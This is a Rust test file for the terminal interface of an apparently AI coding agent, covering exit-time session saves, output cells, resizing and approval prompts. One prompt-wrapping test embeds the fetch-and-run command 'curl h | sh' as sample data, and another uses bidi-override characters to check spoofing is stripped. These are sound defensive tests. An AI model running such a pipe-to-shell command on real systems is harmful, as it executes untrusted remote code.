    /// the session reaches disk. Under a wait equal to the inner one the
    /// save would be lost to the bounded exit.
    #[test]
    #[serial]
    fn a_stuck_background_agent_does_not_cost_the_exit_its_session_save() {
        run_async(async {
            let _guard = TestConfigDirGuard::new("tui-exit-save");
            std::fs::create_dir_all(crate::config::paths::local_dir("sessions")).unwrap();
            let abort = create_abort_signal();
            let mut saved_under_equal_wait = None;
            // The roomy wait first: the equal wait leaves its exit work
            // running past the test, under a session name of its own.
            for (name, wait, expect_saved) in [
                ("exit-save-roomy-e6w", EXIT_TEARDOWN_WAIT, true),
                ("exit-save-equal-e6w", EXIT_CANCEL_WAIT, false),
            ] {
                let mut ctx = chat_ctx();
                let app = Arc::clone(&ctx.app.config);
                ctx.use_session(&app, Some(name), abort.clone())
                    .await
                    .unwrap();
                ctx.set_save_session_this_time().unwrap();
                ctx.init_todo_list("persist me e6w");
                let session_files = [
                    ctx.session_file_for(name, crate::config::SessionScope::Global),
                    ctx.session_file_for(name, crate::config::SessionScope::Workspace),
                ];
                assert!(session_files.iter().all(|file| !file.exists()));
                register_stuck_agent(&mut ctx);
                let (tx, mut rx) = unbounded_channel();
                let (joined, _) =
                    join_unattended(spawn_exit(ctx, abort.clone(), tx), &mut rx, wait).await;
                let saved = session_files.iter().any(|file| {
                    std::fs::read_to_string(file).is_ok_and(|text| text.contains("persist me e6w"))
                });
                match expect_saved {
                    true => {
                        assert!(matches!(joined, Join::Finished((_, Ok(()), _))));
                        assert!(saved, "the session was not saved before the exit returned");
                    }
                    false => {
                        saved_under_equal_wait = Some((matches!(joined, Join::TimedOut), saved))
                    }
                }
            }
            // The equal wait is the shape the bug had: it gives up first.
            assert_eq!(saved_under_equal_wait, Some((true, false)));
        });
    }

    /// A SIGTERM latched while the terminal was released survives the
    /// discard that follows a shell-out, which is for the editor's Ctrl+C
    /// only, and still ends the loop at the next select. The handler is
    /// armed before the raise, so the signal cannot reach the default
    /// disposition.
    #[cfg(unix)]
    #[tokio::test]
    #[serial]
    async fn discard_pending_keeps_a_latched_sigterm() {
        let mut termination = Termination::arm().unwrap();
        // SAFETY: raise takes a signal number and no pointers.
        unsafe { libc::raise(libc::SIGTERM) };
        tokio::time::sleep(Duration::from_millis(100)).await;
        termination.discard_pending();
        tokio::time::timeout(Duration::from_secs(2), termination.recv())
            .await
            .expect("the SIGTERM was discarded along with the editor's Ctrl+C");
    }

    /// One worker, and the work task blocks its thread for longer than the
    /// frame is due in: the frame still fires on time, because the task
    /// runs on the blocking pool and the lone worker stays free to service
    /// the time driver. Spawned onto the worker instead, the frame would
    /// wait out the whole block.
    #[tokio::test(flavor = "multi_thread", worker_threads = 1)]
    async fn a_blocking_work_task_does_not_starve_the_frame_timer() {
        const BLOCK: Duration = Duration::from_millis(300);
        let mut frames = FrameScheduler::new(Arc::new(SystemClock));
        let work = spawn_work(async { std::thread::sleep(BLOCK) });
        frames.schedule_frame_in(Duration::from_millis(10));
        let started = Instant::now();
        frames.next_frame().await;
        let waited = started.elapsed();
        assert!(
            waited < BLOCK / 2,
            "the frame waited {waited:?} for a {BLOCK:?} block on the work task"
        );
        work.await.unwrap();
    }

    /// A panic message reaches the loop as late output while the task is
    /// still unwinding, and the loop usually feeds it to the app before
    /// the join error arrives. The app hands back exactly those notices,
    /// and only the lost turn's, so the restored terminal still shows them.
    #[test]
    fn the_lost_turns_late_output_is_handed_back_for_printing() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::Routing,
            text: "from an earlier turn".to_string(),
        });
        assert!(harness.app.turn_late_output().is_empty());

        harness.app.begin_turn("explode", false);
        let (tx, mut rx) = unbounded_channel();
        late_output(tx)("thread 'tokio' panicked at src/x.rs:1:1:\nboom-r7x\n".to_string());
        harness.app.handle_msg(rx.try_recv().unwrap());
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::ToolWarning,
            text: "unrelated".to_string(),
        });
        let late = harness.app.turn_late_output();
        assert_eq!(late.len(), 1, "{late:?}");
        assert!(late[0].contains("boom-r7x"), "{late:?}");
        assert!(late[0].contains("panicked"), "{late:?}");
    }

    /// A background job still writing after its turn ended shares one
    /// trailing cell per call, bounded in bytes, instead of a cell per
    /// pipe read.
    #[test]
    fn out_of_turn_tool_output_shares_one_bounded_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.app.end_turn(false, &TurnOutcome::default());
        let cells_before = harness.app.transcript.len();
        harness
            .app
            .append_tool_output(Some("bg".to_string()), b"first-q7k\n");
        harness
            .app
            .append_tool_output(Some("bg".to_string()), b"second-q7k\n");
        assert_eq!(harness.app.transcript.len(), cells_before + 1);
        let Some(Cell::Text { lines, .. }) = harness.app.transcript.cells().last() else {
            panic!("the output did not land in a text cell");
        };
        assert_eq!(lines, &["first-q7k", "second-q7k"]);

        let line = format!("{}\n", "z".repeat(LATE_OUTPUT_LIMIT / 4));
        for _ in 0..12 {
            harness
                .app
                .append_tool_output(Some("bg".to_string()), line.as_bytes());
        }
        assert_eq!(harness.app.transcript.len(), cells_before + 1);
        let Some(Cell::Text { lines, .. }) = harness.app.transcript.cells().last() else {
            panic!("the output did not stay in its text cell");
        };
        let total: usize = lines.iter().map(|line| line.len() + 1).sum();
        assert!(total <= LATE_OUTPUT_LIMIT, "{total} bytes kept");
        assert!(
            !lines.iter().any(|line| line.contains("q7k")),
            "the oldest lines were kept"
        );
    }

    /// What the exit work prints after `begin_exit` (a panic's message
    /// among it) is the exit's late output, read from the same notices
    /// a turn's would be, and never confused with a turn's.
    #[test]
    fn the_exit_work_has_late_output_of_its_own() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hi", false);
        harness.app.end_turn(false, &TurnOutcome::default());
        let (tx, mut rx) = unbounded_channel();
        let late = late_output(tx);
        late("before the exit b2x".to_string());
        harness.app.handle_msg(rx.try_recv().unwrap());
        harness.app.begin_exit();
        late("thread 'main' panicked at exit e2x".to_string());
        harness.app.handle_msg(rx.try_recv().unwrap());
        assert_eq!(
            harness.app.exit_late_output(),
            ["thread 'main' panicked at exit e2x"]
        );
        assert!(harness.app.turn_late_output().is_empty());
    }

    /// A leftover writer's chunks fold into one cell that keeps its
    /// newest text, so a chatty child cannot grow the transcript by a
    /// cell per write.
    #[test]
    fn late_output_chunks_share_one_bounded_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        let (tx, mut rx) = unbounded_channel();
        let late = late_output(tx);
        late("first-k1q\n".to_string());
        late("second-k1q\n".to_string());
        while let Ok(msg) = rx.try_recv() {
            harness.app.handle_msg(msg);
        }
        assert_eq!(harness.app.transcript.len(), 2);
        assert_eq!(harness.app.turn_late_output(), ["first-k1q\nsecond-k1q"]);

        late("x".repeat(LATE_OUTPUT_LIMIT));
        harness.app.handle_msg(rx.try_recv().unwrap());
        let kept = harness.app.turn_late_output();
        assert_eq!(harness.app.transcript.len(), 2);
        assert_eq!(kept.len(), 1);
        assert_eq!(kept[0].len(), LATE_OUTPUT_LIMIT);
        assert!(!kept[0].contains("k1q"));
    }

    #[test]
    fn a_resize_and_back_reflows_without_duplicating_rows() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("explain", false);
        harness.app.handle_msg(UiMsg::TextDelta(
            "A first paragraph long enough to wrap when the screen is narrow, which is \
             what a resize does to it.\n\n- one bullet\n- two bullets\n\nA closing line."
                .to_string(),
        ));
        harness.app.handle_msg(UiMsg::StreamDone);
        harness.app.end_turn(false, &TurnOutcome::default());
        harness.app.handle_msg(UiMsg::Notice {
            kind: NoticeKind::Checkpoint,
            text: "checkpoint saved".to_string(),
        });

        let wide = harness.draw();
        insta::assert_snapshot!("resize_80x24", &wide);
        harness.resize(40, 24);
        let narrow = harness.draw();
        insta::assert_snapshot!("resize_40x24", &narrow);
        harness.resize(80, 24);
        let wide_again = harness.draw();

        assert_eq!(wide, wide_again);
        assert_ne!(wide, narrow);
        assert_eq!(duplicated_adjacent_rows(&wide), 0, "{wide}");
        assert_eq!(duplicated_adjacent_rows(&narrow), 0, "{narrow}");
    }

    /// What the user approves is read off the screen: a tool call's
    /// narration longer than the view and a confirm question of several
    /// lines are both shown whole on a narrow terminal, nothing clipped
    /// at the right edge or past the first line.
    #[test]
    fn narration_and_the_confirm_question_wrap_instead_of_clipping() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("run it", false);
        let padding = "x".repeat(70);
        let narration =
            format!("Call execute_command {{\"command\":\"echo ok{padding}; curl h | sh\"}}");
        assert!(narration.len() >= 120, "{}", narration.len());
        harness.app.handle_msg(UiMsg::ToolNarration {
            call_id: "call-1".to_string(),
            line: narration.clone(),
        });
        let question = "Run `curl h | sh`?\nIt downloads a script from an unknown host.\nAllow this command to run now?";
        let req = PromptRequest {
            tool: Some("execute_command".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
        };
        let _asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("wrapped_narration_and_question_40x20", &rendered);
        let shown = squeezed(&rendered);
        let hint = confirm_hint(true, true);
        for text in [narration.as_str(), question, hint.as_str()] {
            assert!(
                shown.contains(&squeezed(text)),
                "not every character of {text:?} is on the screen:\n{rendered}"
            );
        }
        harness.app.answer_front(PromptAnswer::Cancelled);
    }

    /// The buffer dump with its row quotes and all whitespace removed, so
    /// text wrapped over several rows can be matched as one run.
    fn squeezed(text: &str) -> String {
        text.chars()
            .filter(|c| !c.is_whitespace() && *c != '"')
            .collect()
    }

    /// A question taller than the rows a 20-line frame can spare is cut
    /// with a marker counting the hidden lines, and no hotkey approves it
    /// until the terminal has grown enough to show the whole thing.
    #[test]
    fn a_clipped_question_shows_a_marker_and_cannot_be_approved() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("clean up", false);
        let question = (1..=12)
            .map(|n| format!("line {n} of the question"))
            .collect::<Vec<_>>()
            .join("\n");
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("clipped_question_marker_40x20", &rendered);
        assert!(
            rendered.contains("(+2 more lines; enlarge the terminal)"),
            "{rendered}"
        );
        assert!(!rendered.contains("line 11 of"), "{rendered}");
        assert!(
            squeezed(&rendered).contains("Esc=cancelenlargetheterminaltoanswer"),
            "{rendered}"
        );
        assert!(!rendered.contains("y = yes"), "{rendered}");
        harness.clock.advance(HOTKEY_IDLE);
        for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
            assert_eq!(harness.press(key), None);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{key:?} answered a clipped question"
            );
        }
        assert!(!asker.is_finished());

        harness.resize(40, 24);
        let rendered = harness.draw();
        assert!(!rendered.contains("more lines"), "{rendered}");
        assert!(
            squeezed(&rendered).contains(&squeezed(&question)),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A frame too short for status, modal and footer squeezes the
    /// question below the rows its cap promised; the rows it actually
    /// received decide, so nothing approves it until the terminal grows.
    #[test]
    fn a_question_squeezed_by_a_tiny_frame_cannot_be_approved() {
        let mut harness = Harness::standalone(40, 5);
        harness.app.begin_turn("clean up", false);
        let question = "line 1 of the question\nline 2 of the question\nline 3 of the question";
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);
        harness.draw();
        let given = harness.app.question_area.expect("the modal was drawn");
        assert!(given.height < 3, "{given:?}");
        harness.clock.advance(HOTKEY_IDLE);
        for key in [KeyCode::Char('y'), KeyCode::Char('a'), KeyCode::Enter] {
            assert_eq!(harness.press(key), None);
            assert_eq!(
                harness.app.prompts.len(),
                1,
                "{key:?} answered a squeezed question"
            );
        }
        assert!(!asker.is_finished());

        harness.resize(40, 24);
        let rendered = harness.draw();
        assert!(rendered.contains("line 3 of the question"), "{rendered}");
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    /// A tool-authored question carrying bidi overrides and zero-width
    /// characters is drawn without them, so what the user reads is what
    /// is approved.
    #[test]
    fn a_question_with_format_characters_is_drawn_without_them() {
        let mut harness = Harness::standalone(60, 20);
        harness.app.begin_turn("remove it", false);
        let question = "Delete \u{202E}txt.safe\u{202C} \u{200B}k7m\u{200F}\u{FEFF}?";
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);
        let rendered = harness.draw();
        assert!(rendered.contains("Delete txt.safe k7m?"), "{rendered}");
        for hidden in ['\u{202E}', '\u{202C}', '\u{200B}', '\u{200F}', '\u{FEFF}'] {
            assert!(
                !rendered.contains(hidden),
                "{hidden:?} reached the frame:\n{rendered}"
            );
        }
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Esc), None);
        assert_eq!(asker.join().unwrap().unwrap(), PromptAnswer::Cancelled);
    }

    /// A tool-controlled path in the question is shown whole: on 40 columns
    /// a 300-character path wraps over several rows and every character of
    /// it is on screen before `y` can approve it.
    #[test]
    fn a_long_path_in_the_confirm_question_is_shown_whole() {
        let mut harness = Harness::standalone(40, 20);
        harness.app.begin_turn("remove it", false);
        let path = format!(
            "/tmp/{}/{}/{}",
            "a".repeat(100),
            "b".repeat(100),
            "c".repeat(93)
        );
        assert_eq!(path.len(), 300);
        let question = format!("Remove '{path}'?");
        let req = PromptRequest {
            tool: Some("fs_rm".to_string()),
            ..PromptRequest::new(PromptAction::Confirm, &question, Origin::detached())
        };
        let asker = ask_on_a_thread(&mut harness, req);

        let rendered = harness.draw();
        insta::assert_snapshot!("long_path_confirm_40x20", &rendered);
        assert!(
            squeezed(&rendered).contains(&squeezed(&question)),
            "{rendered}"
        );
        harness.clock.advance(HOTKEY_IDLE);
        assert_eq!(harness.press(KeyCode::Char('y')), None);
        assert_eq!(
            asker.join().unwrap().unwrap(),
            PromptAnswer::Confirmed(true)
        );
    }

    #[test]
    fn every_widget_survives_a_tiny_screen() {
        for (width, height) in [(1, 1), (0, 0), (3, 2), (10, 3)] {
            let mut harness = Harness::standalone(width, height);
            harness.render();
            harness.app.begin_turn("hi", false);
            narrate(
                &mut harness,
                "call-1",
                "Call fs_read \u{2714}\u{fe0f} {\"path\":\"x\"}",
            );
            start_tool(&mut harness, "call-1", "fs_read", None);
            tool_output(&mut harness, "call-1", "\u{2714}\u{fe0f} done\n");
            harness.render();
            finish_tool(&mut harness, "call-1", true, None);
            harness.app.handle_key(ctrl(KeyCode::Up));
            harness.render();
            harness
                .app
                .handle_msg(UiMsg::TextDelta("reply".to_string()));
            harness
                .app
                .handle_msg(UiMsg::UsageUpdated("12 tokens".to_string()));
            harness.app.handle_msg(UiMsg::TodoUpdated(todo_items()));
            harness.press(KeyCode::F(2));
            harness.render();
            harness.press(KeyCode::F(2));
            harness.press(KeyCode::PageUp);
            harness.app.transcript.push(Cell::user("late"));
            harness.render();
            let _asker = ask_on_a_thread(&mut harness, confirm_request(Some("fs_write")));
            harness.render();
            harness.press(KeyCode::Esc);
        }
    }

    #[test]
    fn the_footer_strips_the_right_prompt_colours() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.handle_msg(UiMsg::UsageUpdated(
            "\x1b[36m[low] \x1b[35m$0.0012 \x1b[0m".to_string(),
        ));
        let rendered = harness.draw();
        assert!(rendered.contains("[low] $0.0012"), "{rendered}");
        assert!(!rendered.contains('\x1b'), "{rendered:?}");
    }

    #[test]
    fn a_pending_prefill_lands_in_the_composer_on_idle_return() {
        let mut ctx = chat_ctx();
        ctx.pending_prefill = Some("edited line".to_string());
        let mut harness = Harness::for_ctx(&ctx);
        harness.app.sync_from_ctx(&mut ctx);
        assert_eq!(harness.app.composer_text(), "edited line");
        assert_eq!(ctx.pending_prefill, None);
        assert_eq!(
            harness.press(KeyCode::Enter),
            Some(Command::Submit("edited line".to_string()))
        );
        assert_eq!(harness.app.composer_text(), "");
    }

    /// The elapsed-time row keeps ticking: the tick is asked for after the
    /// scheduler forgets the frame just drawn, so it is not wiped with it.
    #[test]
    fn the_status_row_ticks_once_a_second_while_a_turn_runs() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("work", false);
        harness.render();
        harness.app.frame_drawn();
        let due = harness.app.frames.due_at().expect("a tick is pending");
        harness.clock.advance(STATUS_TICK);
        assert!(due <= harness.clock.now());
        let rendered = harness.draw();
        assert!(
            rendered.contains("Working . 1s  Esc to interrupt"),
            "{rendered}"
        );

        harness.app.end_turn(false, &TurnOutcome::default());
        harness.render();
        harness.app.frame_drawn();
        assert_eq!(harness.app.frames.due_at(), None);
    }

    #[test]
    fn the_status_row_names_thinking_and_the_running_tool() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("work", false);
        harness.app.handle_msg(UiMsg::ThinkingStarted);
        harness.clock.advance(Duration::from_secs(3));
        let rendered = harness.draw();
        assert!(rendered.contains("Thinking for 3s"), "{rendered}");

        harness
            .app
            .handle_msg(UiMsg::ToolRunning(Some("fs_write".to_string())));
        let rendered = harness.draw();
        assert!(rendered.contains("Running fs_write"), "{rendered}");
        harness.app.handle_msg(UiMsg::ToolRunning(None));
        harness.app.handle_msg(UiMsg::ThinkingStopped);
        let rendered = harness.draw();
        assert!(rendered.contains("Working . 3s"), "{rendered}");
    }

    /// Once the teardown task owns the context the keys that would start
    /// something new (a line, the editor, an interrupt, another quit) are
    /// inert, typing still works, and the strip says what is happening.
    #[test]
    fn teardown_keys_do_nothing_new_and_the_strip_says_leaving() {
        let mut harness = Harness::standalone(80, 24);
        harness.type_text("draft");
        harness.app.begin_exit();
        assert!(harness.app.key_context().turn_running);
        assert_eq!(harness.press(KeyCode::Enter), None);
        assert_eq!(harness.press(KeyCode::Esc), None);
        for c in ['o', 'd', 'c'] {
            assert_eq!(
                harness
                    .app
                    .handle_key(KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL)),
                None,
                "Ctrl+{c} during teardown"
            );
        }
        harness.type_text("!");
        assert_eq!(harness.app.composer_text(), "draft!");
        let rendered = harness.draw();
        assert!(rendered.contains("Leaving..."), "{rendered}");
    }

    /// A child agent's tool hooks leave the root's status row alone.
    #[test]
    fn only_root_tool_hooks_drive_the_status_row() {
        use crate::hooks::HookEvent;
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        let hook = |origin: Origin| Event::Hook {
            event: HookEvent::ToolStarted,
            envs: vec![("COYOTE_TOOL_NAME".to_string(), "fs_write".to_string())],
            payload: None,
            origin,
        };
        sink.on_event(&hook(Origin {
            agent_id: Some("agent_1".to_string()),
            depth: 1,
        }));
        sink.on_event(&hook(Origin {
            agent_id: None,
            depth: 1,
        }));
        assert!(rx.try_recv().is_err());
        sink.on_event(&hook(Origin::detached()));
        assert!(matches!(
            rx.try_recv(),
            Ok(UiMsg::ToolRunning(Some(tool))) if tool == "fs_write"
        ));
    }

    /// A child agent's tool output stays out of the root transcript, as
    /// the REPL keeps it off the terminal; the root's own still lands.
    #[test]
    fn only_root_tool_output_reaches_the_transcript() {
        use crate::events::OutputStream;
        use crate::turn::UiSink;
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        sink.tool_output(Some("child-c3t"), OutputStream::Stdout, 1, b"child line\n");
        sink.tool_output(None, OutputStream::Stderr, 2, b"grandchild line\n");
        assert!(rx.try_recv().is_err(), "a child's output reached the UI");
        sink.tool_output(Some("root-c3t"), OutputStream::Stdout, 0, b"root line\n");
        assert!(matches!(
            rx.try_recv(),
            Ok(UiMsg::ToolOutput { call_id: Some(id), bytes })
                if id == "root-c3t" && bytes == b"root line\n"
        ));
    }

    /// Thinking events reach the status row through the sink, the same
    /// way the tool hooks do.
    #[test]
    fn thinking_events_pass_through_the_sink() {
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        sink.on_event(&Event::ThinkingStarted {
            origin: Origin::detached(),
        });
        assert!(matches!(rx.try_recv(), Ok(UiMsg::ThinkingStarted)));
        sink.on_event(&Event::ThinkingStopped {
            origin: Origin::detached(),
        });
        assert!(matches!(rx.try_recv(), Ok(UiMsg::ThinkingStopped)));
        assert!(rx.try_recv().is_err());
    }

    /// A child agent's reasoning says nothing about what the root is
    /// doing, so only root-origin thinking events reach the status row.
    #[test]
    fn a_child_agents_thinking_never_drives_the_status_row() {
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        let child = Origin {
            agent_id: Some("agent_c".into()),
            depth: 1,
        };
        sink.on_event(&Event::ThinkingStarted {
            origin: child.clone(),
        });
        sink.on_event(&Event::ThinkingStopped { origin: child });
        assert!(rx.try_recv().is_err(), "a child's thinking reached the UI");
        sink.on_event(&Event::ThinkingStarted {
            origin: Origin::detached(),
        });
        assert!(matches!(rx.try_recv(), Ok(UiMsg::ThinkingStarted)));
    }

    /// An editor that exits non-zero has not finished the edit: the text
    /// stays as it was, and the temp directory is gone either way, even
    /// when the editor left files of its own in it.
    #[test]
    #[cfg(unix)]
    fn a_failing_editor_leaves_the_text_as_it_was() {
        use std::os::unix::fs::PermissionsExt;
        let script = crate::utils::temp_file("-editor-", ".sh");
        // The script records the buffer's own directory, so the check is
        // for this call's directory and not for whatever a sibling case
        // has live at the same moment.
        let recorded = crate::utils::temp_file("-editor-dir-", ".txt");
        std::fs::write(
            &script,
            format!(
                "#!/bin/sh\ndirname \"$1\" > '{}'\nprintf changed > \"$1\"\ntouch \"$1.swp\"\nexit 3\n",
                recorded.display()
            ),
        )
        .unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();

        let edited = edit_in_editor(script.to_str().unwrap(), "draft").unwrap();
        std::fs::remove_file(&script).unwrap();
        let dir = std::fs::read_to_string(&recorded).unwrap();
        std::fs::remove_file(&recorded).unwrap();

        assert_eq!(edited, "draft");
        let dir = std::path::Path::new(dir.trim());
        assert!(
            dir.file_name()
                .is_some_and(|n| n.to_string_lossy().contains("-tui-edit-"))
        );
        assert!(
            !dir.exists(),
            "the editor's temp directory was left behind: {}",
            dir.display()
        );
        let gone = edit_in_editor("true", "kept\n").unwrap();
        assert_eq!(gone, "kept");
    }

    /// The buffer lives in a private directory and is private itself, so
    /// an editor that saves by write-then-rename (its new file in its own
    /// mode) still leaves nothing another user can read.
    #[test]
    #[cfg(unix)]
    fn the_editor_buffer_sits_in_a_private_directory() {
        use std::os::unix::fs::PermissionsExt;
        let script = crate::utils::temp_file("-editor-", ".sh");
        std::fs::write(
            &script,
            "#!/bin/sh\nstat -f '%Lp %Lp' \"$(dirname \"$1\")\" \"$1\" >\"$1.modes\" 2>/dev/null \
             || stat -c '%a' \"$(dirname \"$1\")\" \"$1\" | tr '\\n' ' ' >\"$1.modes\"\n\
             cat \"$1.modes\" > \"$1\"\nexit 0\n",
        )
        .unwrap();
        std::fs::set_permissions(&script, std::fs::Permissions::from_mode(0o700)).unwrap();
        let modes = edit_in_editor(script.to_str().unwrap(), "x").unwrap();
        std::fs::remove_file(&script).unwrap();
        let modes: Vec<&str> = modes.split_whitespace().collect();
        assert_eq!(modes, ["700", "600"], "{modes:?}");
    }

    /// Emitters paint notices for the REPL (`error_text`, a leading
    /// newline for spacing); the sink strips that so the cell shows the
    /// words on its first row and no escape bytes.
    #[test]
    fn a_painted_notice_reaches_the_frame_as_plain_words() {
        use crate::turn::UiSink;
        let (tx, mut rx) = unbounded_channel();
        let sink = TuiSink::new(tx);
        sink.notice(
            NoticeKind::Interrupted,
            "\n\x1b[31mResponse interrupted\x1b[0m",
        );
        let mut harness = Harness::standalone(40, 10);
        harness.app.handle_msg(rx.try_recv().unwrap());
        let frame = harness.draw();
        let first_row = frame.lines().next().unwrap();
        assert!(first_row.contains("Response interrupted"), "{frame}");
        assert!(!frame.contains("[31m"), "{frame}");
    }

    /// Cells drawn as plain lines are scrubbed at the draw whatever path
    /// fed them: a user line, an error and a notice pushed straight into
    /// the transcript show their words and no escape or format bytes.
    #[test]
    fn plain_cells_are_scrubbed_when_drawn() {
        let mut harness = Harness::standalone(60, 12);
        harness.app.begin_turn("hi\x1b[2Jthere\u{200b}u7p", false);
        harness.app.transcript.push(Cell::Error {
            text: "\x1b[31mbroken\x1b[0m e7p".to_string(),
            cache: LineCache::default(),
        });
        harness.app.transcript.push(Cell::notice(
            NoticeKind::Routing,
            "\x1b]8;;x\x07note\x1b]8;;\x07 n7p".to_string(),
        ));
        let frame = harness.draw();
        for word in ["> hithereu7p", "broken e7p", "note n7p"] {
            assert!(frame.contains(word), "{word:?} missing:\n{frame}");
        }
        assert!(
            !frame.contains('\x1b') && !frame.contains('\u{200b}'),
            "{frame}"
        );
    }

    /// The final text of a reply is authoritative: it replaces whatever
    /// the stream had accumulated and closes the cell.
    #[test]
    fn assistant_text_replaces_an_open_stream_cell() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hi", false);
        harness
            .app
            .handle_msg(UiMsg::TextDelta("partial".to_string()));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("the whole reply".to_string()));
        assert_eq!(harness.app.transcript.len(), 2);
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Assistant { source, done: true, .. } if source == "the whole reply"
        ));
        harness
            .app
            .handle_msg(UiMsg::AssistantText("a second reply".to_string()));
        assert_eq!(harness.app.transcript.len(), 3);
    }

    /// A cell pushed while the reply streams (a background job's output
    /// here) lands after the reply, and the next delta still extends the
    /// reply rather than opening a second one.
    #[test]
    fn a_stream_survives_a_cell_pushed_between_deltas() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hi", false);
        harness
            .app
            .handle_msg(UiMsg::TextDelta("Hello".to_string()));
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"job noise\n".to_vec(),
        });
        harness
            .app
            .handle_msg(UiMsg::TextDelta(" world".to_string()));
        let cells = harness.app.transcript.cells();
        assert_eq!(cells.len(), 3);
        assert!(matches!(
            &cells[1],
            Cell::Assistant { source, done: false, .. } if source == "Hello world"
        ));
        assert!(matches!(
            &cells[2],
            Cell::Text { call_id: None, lines, .. } if lines == &["job noise"]
        ));
        harness.app.handle_msg(UiMsg::StreamDone);
        assert!(matches!(
            &harness.app.transcript.cells()[1],
            Cell::Assistant { done: true, .. }
        ));
        harness.app.handle_msg(UiMsg::TextDelta("next".to_string()));
        assert_eq!(harness.app.transcript.len(), 4);
    }

    /// Undoing past the streaming cell forgets it; a later delta opens a
    /// fresh cell instead of writing into whatever took its index.
    #[test]
    fn truncating_past_the_stream_cell_forgets_it() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("hi", false);
        harness
            .app
            .handle_msg(UiMsg::TextDelta("partial".to_string()));
        harness.app.transcript.truncate(1);
        harness.app.transcript.push(Cell::notice(
            NoticeKind::ToolWarning,
            "took the slot".to_string(),
        ));
        harness
            .app
            .handle_msg(UiMsg::TextDelta("fresh".to_string()));
        let cells = harness.app.transcript.cells();
        assert!(matches!(&cells[1], Cell::Notice { .. }));
        assert!(matches!(
            &cells[2],
            Cell::Assistant { source, done: false, .. } if source == "fresh"
        ));
    }

    #[test]
    fn chrome_colours_are_dropped_under_no_color_but_attributes_stay() {
        for kind in [
            ChromeKind::Notice(NoticeKind::ToolWarning),
            ChromeKind::Error,
        ] {
            assert!(chrome_style(kind, false).fg.is_some(), "{kind:?}");
            assert_eq!(chrome_style(kind, true).fg, None, "{kind:?}");
        }
        let dim = ChromeKind::Notice(NoticeKind::Checkpoint);
        for no_color in [false, true] {
            let style = chrome_style(dim, no_color);
            assert_eq!(style.fg, None);
            assert!(style.add_modifier.contains(Modifier::DIM));
        }
    }

    /// The transcript's cells take the colour decision from the same
    /// switch the composer does, so one flip covers the whole frame.
    #[test]
    fn a_drawn_error_cell_follows_the_no_color_switch() {
        for (no_color, fg) in [(false, Color::Red), (true, Color::Reset)] {
            let mut harness = Harness::standalone(60, 12);
            harness.app.set_no_color(no_color);
            harness.app.transcript.push(Cell::Error {
                text: "broken q8c".to_string(),
                cache: LineCache::default(),
            });
            let frame = harness.draw();
            let row = screen_row(&harness, "broken q8c");
            let buffer = harness.terminal.backend().buffer();
            assert_eq!(buffer[(0, row)].fg, fg, "{no_color}: {frame}");
        }
    }

    /// What a prompt turn printed around the modal becomes a notice with
    /// its escapes removed; the spinner's glyph is text and stays.
    #[test]
    fn captured_output_becomes_a_clean_notice() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn("ask", false);
        harness.app.end_turn(
            false,
            &TurnOutcome {
                captured: "\x1b[0G\u{280b}\x1b[?25l Thinking\x1b[1m!\x1b[0m\n".to_string(),
                ..TurnOutcome::default()
            },
        );
        assert!(matches!(
            harness.app.transcript.cells().last(),
            Some(Cell::Notice { text, .. }) if text == "\u{280b} Thinking!"
        ));
    }

    /// Anonymous tool output continues the cell it is streaming into, but
    /// never one left over from an earlier turn.
    #[test]
    fn anonymous_tool_output_never_joins_an_older_turn() {
        let mut harness = Harness::standalone(80, 24);
        harness.app.begin_turn(".run", true);
        harness.app.handle_msg(UiMsg::ToolOutput {
            call_id: None,
            bytes: b"first".to_vec(),
        });
